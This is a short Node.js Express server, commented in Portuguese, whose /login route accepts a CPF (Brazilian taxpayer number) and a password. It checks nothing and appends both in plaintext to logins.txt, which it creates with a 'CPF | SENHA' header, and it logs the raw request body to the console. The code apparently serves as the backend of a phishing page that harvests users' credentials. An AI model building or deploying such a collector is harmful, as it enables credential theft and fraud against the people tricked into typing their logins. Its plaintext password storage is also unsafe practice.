const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
const PORT = 3000;

app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

const filePath = path.join(__dirname, 'logins.txt');

// Cria o arquivo com cabeçalho se não existir
if (!fs.existsSync(filePath)) {
  const header = `CPF              | SENHA           \n` +
                 `-----------------|-----------------\n`;
  try {
    fs.writeFileSync(filePath, header);
    console.log('Arquivo logins.txt criado com cabeçalho.');
  } catch (err) {
    console.error('Erro ao criar o arquivo logins.txt:', err);
  }
}

app.post('/login', (req, res) => {
  try {
    console.log('Requisição recebida:', req.body);

    const { cpf, senha } = req.body;

    if (!cpf || !senha) {
      return res.status(400).json({ message: 'CPF e senha são obrigatórios.' });
    }

    const cpfStr = String(cpf);
    const senhaStr = String(senha);
    const linha = `${cpfStr.padEnd(17)}| ${senhaStr.padEnd(17)}\n`;

    fs.appendFile(filePath, linha, (err) => {
      if (err) {
        console.error('Erro ao salvar os dados:', err);
        return res.status(500).json({ message: 'Erro ao salvar os dados.' });
      }

      console.log('Dados salvos com sucesso:', linha.trim());
      return res.json({ message: 'Login salvo com sucesso!' });
    });
  } catch (error) {
    console.error('Erro inesperado:', error);
    return res.status(500).json({ message: 'Erro inesperado no servidor.' });
  }
});

// Rota para testar escrita no arquivo manualmente
app.get('/teste', (req, res) => {
  fs.appendFile(filePath, 'Linha de teste\n', (err) => {
    if (err) {
      console.error('Erro ao escrever no arquivo:', err);
      return res.status(500).send('Erro ao escrever no arquivo');
    }
    res.send('Escrita OK');
  });
});

app.listen(PORT, () => {
  console.log(`Servidor rodando em: http://localhost:${PORT}`);
});
